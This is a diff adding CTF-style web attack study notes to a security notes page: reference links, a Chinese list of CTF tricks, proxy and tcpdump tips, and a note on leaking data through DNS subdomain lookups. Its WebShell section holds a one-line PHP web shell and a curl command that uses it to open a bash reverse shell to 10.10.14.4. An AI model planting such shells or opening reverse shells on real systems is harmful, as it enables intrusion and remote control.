@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/Misc.html">Misc</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:53 AM        </span>
+            February 16, 2021 at 12:55 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/010_Misc.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,147 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Web_Application_Attacks_Main">Web Application Attacks Main</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Web_Application_Attacks_Main">Web Application Attacks Main</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+</li>
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_DNSBIN">DNSBIN</a></p>
+</li>
+<li>
+<p><a href="#page_Webhook">Webhook</a></p>
+</li>
+<li>
+<p><a href="#page_Web_Proxy_Tools">Web Proxy Tools</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_BurpSuite">BurpSuite</a></p>
+</li>
+<li>
+<p><a href="#page_OWASP_ZAP">OWASP ZAP</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_tcpdump">tcpdump</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Misc_Attack_Technical">Misc Attack Technical</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_WebShell">WebShell</a></p>
+</li>
+<li>
+<p><a href="#page_Race_Condition">Race Condition</a></p>
+</li>
+<li>
+<p><a href="#page_Javascript_Prototype_Pollution">Javascript Prototype Pollution</a></p>
+</li>
+<li>
+<p><a href="#page_CSS_Injection">CSS Injection</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h1 id="page_Reference">Reference</h1>
+<p><a href="https://portswigger.net/web-security" class="Link--external" rel="noopener noreferrer">PORTSWIGGER - Web Security Academy</a></p>
+<ul>
+<li>php</li>
+<li>weak password</li>
+<li>insecure direct object references
+<ul>
+<li>/user/getAccount</li>
+<li>/admin/getAccount</li>
+</ul>
+</li>
+<li>injection
+<ul>
+<li>Command Injection</li>
+<li>CRLF Injection</li>
+<li>SQL Injection / NoSQL Injection</li>
+<li>XPath Injection</li>
+<li>Template Injection</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://github.com/w181496/Web-CTF-Cheatsheet" class="Link--external" rel="noopener noreferrer">Kaibro - Web-CTF-Cheatsheet</a></p>
+<p><a href="https://docs.google.com/presentation/d/1Cx0vI2Mzy0zwdTrgic3S3TwGMCpH-QhMUdHU1r3AYfI" class="Link--external" rel="noopener noreferrer">CTF比赛总是输？你还差点Tricks!</a></p>
+<ol>
+<li>爆破，包括md5、爆破隨機數、驗證碼識別等</li>
+<li>繞WAF，包括花式繞MySQL、繞文件讀取關鍵詞檢測之類攔截</li>
+<li>花式玩弄幾個PHP特性，包括弱類型，反序列化+destruct、\0截斷、iconv截斷</li>
+<li>密碼題，包括hash長度擴展、亦或、移位加密各種變形、32位隨機數過小、隨機數種子可預測等</li>
+<li>MySQL類型差異、包括和PHP弱類型類似的特性,0x、0b、0e之類，varchar和integer相互轉換，非strict模式截斷等</li>
+<li>open_basedir、disable_function花式繞過技巧，包括dl、mail、imagick、bash漏洞、Directorylterator及各種二進制選手差足的方法</li>
+<li>條件競爭，包括競爭刪除前生成shell、競爭數據庫無鎖多扣錢</li>
+<li>社交攻擊，包括查whois</li>
+<li>windows特性，包括短文件名、IIS解析漏洞、NTFS文件系統通配符、<code>::$DATA</code>、冒號截斷</li>
+<li>協議，花式IP偽造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、花式藏FLAG、花式分析數據包</li>
+</ol>
+<h1 id="page_Tools">Tools</h1>
+<h2 id="page_DNSBIN">DNSBIN</h2>
+<p><a href="https://github.com/ettic-team/dnsbin" class="Link--external" rel="noopener noreferrer">GitHub - ettic-team/dnsbin</a>: <a href="http://dnsbin.zhack.ca/" class="Link--external" rel="noopener noreferrer">dnsbin.zhack.ca</a>
+<a href="https://github.com/mxcxvn/requestbin.net" class="Link--external" rel="noopener noreferrer">GitHub - mxcxvn/requestbin.net</a>: <a href="http://requestbin.net/dns" class="Link--external" rel="noopener noreferrer">requestbin.net/dns</a>
+有時候可以把要 leak 的東西放在 subdomain，像是 leak.wildfoo.tw，這樣受害主機在做 DNS 查詢的時候，就會把資料帶給 DNS Server</p>
+<h2 id="page_Webhook">Webhook</h2>
+<p><a href="https://github.com/fredsted/webhook.site" class="Link--external" rel="noopener noreferrer">GitHub - fredsted/webhook.site</a>: <a href="https://webhook.site/" class="Link--external" rel="noopener noreferrer">webhook.site</a></p>
+<h2 id="page_Web_Proxy_Tools">Web Proxy Tools</h2>
+<h3 id="page_BurpSuite">BurpSuite</h3>
+<ul>
+<li>
+<a href="https://www.th3r3p0.com/random/python-requests-and-burp-suite.html" class="Link--external" rel="noopener noreferrer">Python Requests and Burp Suite</a>
+</li>
+</ul>
+<pre><code class="language-python=">import requests
+proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;}
+r = requests.get(&quot;https://www.google.com/&quot;, proxies=proxies, verify=False)
+</code></pre>
+<p>or</p>
+<pre><code class="language-shell=">openssl x509 -inform der -in certificate.cer -out certificate.pem
+export REQUESTS_CA_BUNDLE=&quot;/path/to/pem/encoded/cert&quot;
+export HTTP_PROXY=&quot;http://127.0.0.1:8080&quot;
+export HTTPS_PROXY=&quot;http://127.0.0.1:8080&quot;
+</code></pre>
+<h3 id="page_OWASP_ZAP">OWASP ZAP</h3>
+<h2 id="page_tcpdump">tcpdump</h2>
+<pre><code>tcpdump -i lo -q tcp port 6001 -w -
+-i interface
+-q Quick output
+-w wirte the raw packets to file. &quot;-&quot; means stdout
+</code></pre>
+<h1 id="page_Misc_Attack_Technical">Misc Attack Technical</h1>
+<h2 id="page_WebShell">WebShell</h2>
+<p><code>&lt;?php system($_REQUEST[&quot;exec&quot;]);?&gt;</code></p>
+<pre><code>curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.4/1234 0&gt;&amp;1&quot;'
+</code></pre>
+<ul>
+<li>
+<a href="https://hackmd.io/@WildfootW/BkN7LbLTr#collection" class="Link--external" rel="noopener noreferrer">Collection</a>
+</li>
+</ul>
+<h2 id="page_Race_Condition">Race Condition</h2>
+<h2 id="page_Javascript_Prototype_Pollution">Javascript Prototype Pollution</h2>
+<h2 id="page_CSS_Injection">CSS Injection</h2>
+    </div>
 
         <nav>
         <ul class="Pager">
